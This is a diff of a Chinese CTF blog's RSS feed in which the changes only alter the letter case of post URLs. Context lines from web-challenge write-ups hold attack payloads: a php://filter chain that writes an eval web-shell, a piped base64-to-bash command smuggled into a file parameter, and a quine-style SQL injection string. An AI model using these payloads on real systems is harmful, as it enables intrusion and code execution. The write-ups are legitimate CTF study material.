@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>k1te's blog</title><link>https://k1te.cn/</link><description>Recent content on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jan 2022 10:10:38 +0800</lastBuildDate><atom:link href="https://k1te.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>LFI 新姿势学习</title><link>https://k1te.cn/2022/01/10/lfi%E5%AD%A6%E4%B9%A0/</link><pubDate>Mon, 10 Jan 2022 10:10:38 +0800</pubDate><guid>https://k1te.cn/2022/01/10/lfi%E5%AD%A6%E4%B9%A0/</guid><description>&lt;p>前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>k1te's blog</title><link>https://k1te.cn/</link><description>Recent content on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jan 2022 10:10:38 +0800</lastBuildDate><atom:link href="https://k1te.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>LFI 新姿势学习</title><link>https://k1te.cn/2022/01/10/LFI%E5%AD%A6%E4%B9%A0/</link><pubDate>Mon, 10 Jan 2022 10:10:38 +0800</pubDate><guid>https://k1te.cn/2022/01/10/LFI%E5%AD%A6%E4%B9%A0/</guid><description>&lt;p>前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下&lt;/p>
 &lt;!-- raw HTML omitted -->
 &lt;h2 id="pearcmdphp">pearcmd.php&lt;/h2>
 &lt;h3 id="config-create">config-create&lt;/h3>
@@ -494,7 +494,7 @@ alt="image-20220111001134640"
 &lt;p>&lt;a class="link" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT" target="_blank" rel="noopener"
 >GitHub - wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT&lt;/a>&lt;/p>
 &lt;p>&lt;a class="link" href="https://blog.zeddyu.info/2020/01/08/36c3-web/#includer" target="_blank" rel="noopener"
->36c3 Web 学习记录 (zeddyu.info)&lt;/a>&lt;/p></description></item><item><title>2021美团网络安全高校挑战赛web部分wp</title><link>https://k1te.cn/2021/12/13/2021mtctf/</link><pubDate>Mon, 13 Dec 2021 15:51:24 +0800</pubDate><guid>https://k1te.cn/2021/12/13/2021mtctf/</guid><description>&lt;p>跟着队友学到了不少东西&lt;/p>
+>36c3 Web 学习记录 (zeddyu.info)&lt;/a>&lt;/p></description></item><item><title>2021美团网络安全高校挑战赛web部分wp</title><link>https://k1te.cn/2021/12/13/2021MTCTF/</link><pubDate>Mon, 13 Dec 2021 15:51:24 +0800</pubDate><guid>https://k1te.cn/2021/12/13/2021MTCTF/</guid><description>&lt;p>跟着队友学到了不少东西&lt;/p>
 &lt;!-- raw HTML omitted -->
 &lt;h2 id="hackme">HackMe&lt;/h2>
 &lt;p>随便上传一个东西显示“HACK! I filtered all the characters.”，尝试上传一个a，发现可以，上传&lt;code>aa&lt;/code>不行，上传&lt;code>a a&lt;/code>可以，猜测是字符不能连在一起，可以用utf-16绕过，随便拿个jsp马转成utf-16即可：&lt;/p>
@@ -844,7 +844,7 @@ alt="image-20211213152906765"
 &lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>log处的死亡exit绕过可以参考&lt;a class="link" href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md" target="_blank" rel="noopener"
->2020WMCTF的checkin&lt;/a>，payload：&lt;code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&amp;gt;&amp;lt;?php%0deval($_GET[1]);?&amp;gt;/resource=shell.php &lt;/code>&lt;/p></description></item><item><title>Java反序列化基础</title><link>https://k1te.cn/2021/12/12/java%E5%9F%BA%E7%A1%80/</link><pubDate>Sun, 12 Dec 2021 15:53:17 +0800</pubDate><guid>https://k1te.cn/2021/12/12/java%E5%9F%BA%E7%A1%80/</guid><description>&lt;p>Java入门的简单基础，包括序列化反序列化、反射、类的动态加载，动态代理暂时还没用到，后面用到再加上。&lt;/p>
+>2020WMCTF的checkin&lt;/a>，payload：&lt;code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&amp;gt;&amp;lt;?php%0deval($_GET[1]);?&amp;gt;/resource=shell.php &lt;/code>&lt;/p></description></item><item><title>Java反序列化基础</title><link>https://k1te.cn/2021/12/12/Java%E5%9F%BA%E7%A1%80/</link><pubDate>Sun, 12 Dec 2021 15:53:17 +0800</pubDate><guid>https://k1te.cn/2021/12/12/Java%E5%9F%BA%E7%A1%80/</guid><description>&lt;p>Java入门的简单基础，包括序列化反序列化、反射、类的动态加载，动态代理暂时还没用到，后面用到再加上。&lt;/p>
 &lt;!-- raw HTML omitted -->
 &lt;h3 id="序列化和反序列化">序列化和反序列化&lt;/h3>
 &lt;p>&lt;strong>Java序列化&lt;/strong>是指把Java对象转换为字节序列的过程；而&lt;strong>Java反序列化&lt;/strong>是指把字节序列恢复为Java对象的过程。&lt;/p>
@@ -2060,7 +2060,7 @@ file=|echo Y2F0IC9GTEE5X3dtWExYbU9XS0xMUWtwUDBjZUl5|base64 -d|bash||1.png
 &lt;span class="c1">#看上面这篇文章&lt;/span>
 &lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>payload:&lt;code>'UNION/**/SELECT/**/REPLACE(REPLACE('&amp;quot;UNION/**/SELECT/**/REPLACE(REPLACE(&amp;quot;Y&amp;quot;,CHAR(34),CHAR(39)),CHAR(89),&amp;quot;Y&amp;quot;)/**/AS/**/ZZ#',CHAR(34),CHAR(39)),CHAR(89),'&amp;quot;UNION/**/SELECT/**/REPLACE(REPLACE(&amp;quot;Y&amp;quot;,CHAR(34),CHAR(39)),CHAR(89),&amp;quot;Y&amp;quot;)/**/AS/**/ZZ#')/**/AS/**/ZZ#&lt;/code>&lt;/p></description></item><item><title>DasJuly X CBCTF 4th 部分wp</title><link>https://k1te.cn/2021/08/03/dasjuly/</link><pubDate>Tue, 03 Aug 2021 10:42:08 +0800</pubDate><guid>https://k1te.cn/2021/08/03/dasjuly/</guid><description>&lt;p>emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般&lt;/p>
+&lt;/div>&lt;p>payload:&lt;code>'UNION/**/SELECT/**/REPLACE(REPLACE('&amp;quot;UNION/**/SELECT/**/REPLACE(REPLACE(&amp;quot;Y&amp;quot;,CHAR(34),CHAR(39)),CHAR(89),&amp;quot;Y&amp;quot;)/**/AS/**/ZZ#',CHAR(34),CHAR(39)),CHAR(89),'&amp;quot;UNION/**/SELECT/**/REPLACE(REPLACE(&amp;quot;Y&amp;quot;,CHAR(34),CHAR(39)),CHAR(89),&amp;quot;Y&amp;quot;)/**/AS/**/ZZ#')/**/AS/**/ZZ#&lt;/code>&lt;/p></description></item><item><title>DasJuly X CBCTF 4th 部分wp</title><link>https://k1te.cn/2021/08/03/DasJuly/</link><pubDate>Tue, 03 Aug 2021 10:42:08 +0800</pubDate><guid>https://k1te.cn/2021/08/03/DasJuly/</guid><description>&lt;p>emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般&lt;/p>
 &lt;!-- raw HTML omitted -->
 &lt;h1 id="web">Web&lt;/h1>
 &lt;h2 id="ezrce">ezrce&lt;/h2>
@@ -2888,7 +2888,7 @@ alt="image-20210804150727863"
 &lt;/div>
 &lt;/div>&lt;p>是个DataMatrix，直接识别即可&lt;/p>
 &lt;h1 id="写在最后">写在最后&lt;/h1>
-&lt;p>其实不能说题目质量不行，只是因为比赛的时候时间紧，所以就只能直接拿网上的payload打，但是赛后再来看看，照着网上的文章，一个函数一个函数跟进，还是能学到很多东西的。&lt;/p></description></item><item><title>CyBRICS2021</title><link>https://k1te.cn/2021/07/26/cybrics2021/</link><pubDate>Mon, 26 Jul 2021 14:42:08 +0800</pubDate><guid>https://k1te.cn/2021/07/26/cybrics2021/</guid><description>&lt;p>全程被队友们带飞，虽然最后的成绩肯定比不上大佬们的战队，但还是玩的很开心&lt;/p>
+&lt;p>其实不能说题目质量不行，只是因为比赛的时候时间紧，所以就只能直接拿网上的payload打，但是赛后再来看看，照着网上的文章，一个函数一个函数跟进，还是能学到很多东西的。&lt;/p></description></item><item><title>CyBRICS2021</title><link>https://k1te.cn/2021/07/26/cyBrics2021/</link><pubDate>Mon, 26 Jul 2021 14:42:08 +0800</pubDate><guid>https://k1te.cn/2021/07/26/cyBrics2021/</guid><description>&lt;p>全程被队友们带飞，虽然最后的成绩肯定比不上大佬们的战队，但还是玩的很开心&lt;/p>
 &lt;!-- raw HTML omitted -->
 &lt;h1 id="web">Web&lt;/h1>
 &lt;h2 id="ad-network">Ad Network&lt;/h2>
@@ -3271,7 +3271,7 @@ loading="lazy"
 &lt;p>&lt;a class="link" href="http://www.cl4y.top/information%e8%a2%abban%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e8%bf%9b%e8%a1%8csql%e6%b3%a8%e5%85%a5/" target="_blank" rel="noopener"
 >information被ban的情况下进行SQL注入 - Cl4y&amp;rsquo;s SecretCl4y&amp;rsquo;s Secret&lt;/a>&lt;/p>
 &lt;p>&lt;a class="link" href="https://blog.csdn.net/m0_46230316/article/details/106668182" target="_blank" rel="noopener"
->无列名注入总结_D1stiny的博客-CSDN博客_无列名注入&lt;/a>&lt;/p></description></item><item><title>VNCTF2021</title><link>https://k1te.cn/2021/03/14/vnctf/</link><pubDate>Sun, 14 Mar 2021 01:47:24 +0800</pubDate><guid>https://k1te.cn/2021/03/14/vnctf/</guid><description>&lt;h2 id="ezgame">Ezgame&lt;/h2>
+>无列名注入总结_D1stiny的博客-CSDN博客_无列名注入&lt;/a>&lt;/p></description></item><item><title>VNCTF2021</title><link>https://k1te.cn/2021/03/14/VNCTF/</link><pubDate>Sun, 14 Mar 2021 01:47:24 +0800</pubDate><guid>https://k1te.cn/2021/03/14/VNCTF/</guid><description>&lt;h2 id="ezgame">Ezgame&lt;/h2>
 &lt;p>在网上找到这个游戏的&lt;a class="link" href="https://github.com/KilledByAPixel/BounceBack" target="_blank" rel="noopener"
 >源码&lt;/a>，然后在&lt;strong>game.js&lt;/strong>中搜索&lt;strong>win&lt;/strong>关键词，发现当&lt;strong>winTimer.IsSet()&lt;strong>返回&lt;/strong>True&lt;/strong>时，游戏胜利。&lt;/p>
 &lt;p>然后在其他文件里找找，就可以在&lt;strong>gameEngine.js&lt;/strong>中找到&lt;strong>Timer&lt;/strong>类的&lt;strong>isSet&lt;/strong>方法：&lt;/p>
@@ -3410,7 +3410,7 @@ alt="image-20210319173248337"
 &lt;p>&lt;img src="https://raw.githubusercontent.com/zk1te/img/main/image-20210319173545104.png"
 loading="lazy"
 alt="image-20210319173545104"
->&lt;/p></description></item><item><title>2021大吉大利杯</title><link>https://k1te.cn/2021/01/24/djbctf2021/</link><pubDate>Sun, 24 Jan 2021 17:01:00 +0800</pubDate><guid>https://k1te.cn/2021/01/24/djbctf2021/</guid><description>&lt;h1 id="大吉大利杯web部分wp">大吉大利杯web部分wp&lt;/h1>
+>&lt;/p></description></item><item><title>2021大吉大利杯</title><link>https://k1te.cn/2021/01/24/DJBCTF2021/</link><pubDate>Sun, 24 Jan 2021 17:01:00 +0800</pubDate><guid>https://k1te.cn/2021/01/24/DJBCTF2021/</guid><description>&lt;h1 id="大吉大利杯web部分wp">大吉大利杯web部分wp&lt;/h1>
 &lt;p>菜炸了，一部分题是自己做出来的，一部分题是看wp复现的&lt;/p>
 &lt;h2 id="spaceman">spaceman&lt;/h2>
 &lt;p>php代码审计，源码：&lt;/p>
@@ -3867,7 +3867,7 @@ alt="image-20210127124645962"
 loading="lazy"
 alt="image-20210127124946215"
 >&lt;/p>
-&lt;p>revenge只有路由的名字不一样，不知道有啥意义。。。迷&lt;/p></description></item><item><title>BJDCTF2020</title><link>https://k1te.cn/2020/09/28/bjdctf2020/</link><pubDate>Mon, 28 Sep 2020 14:42:08 +0800</pubDate><guid>https://k1te.cn/2020/09/28/bjdctf2020/</guid><description>&lt;h1 id="bjdctf2020-wp">BJDCTF2020 wp&lt;/h1>
+&lt;p>revenge只有路由的名字不一样，不知道有啥意义。。。迷&lt;/p></description></item><item><title>BJDCTF2020</title><link>https://k1te.cn/2020/09/28/BJDCTF2020/</link><pubDate>Mon, 28 Sep 2020 14:42:08 +0800</pubDate><guid>https://k1te.cn/2020/09/28/BJDCTF2020/</guid><description>&lt;h1 id="bjdctf2020-wp">BJDCTF2020 wp&lt;/h1>
 &lt;p>在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。&lt;/p>
 &lt;h2 id="easy-md5">Easy MD5&lt;/h2>
 &lt;p>打开网址之后，在响应标头中找到了hint：&lt;/p>
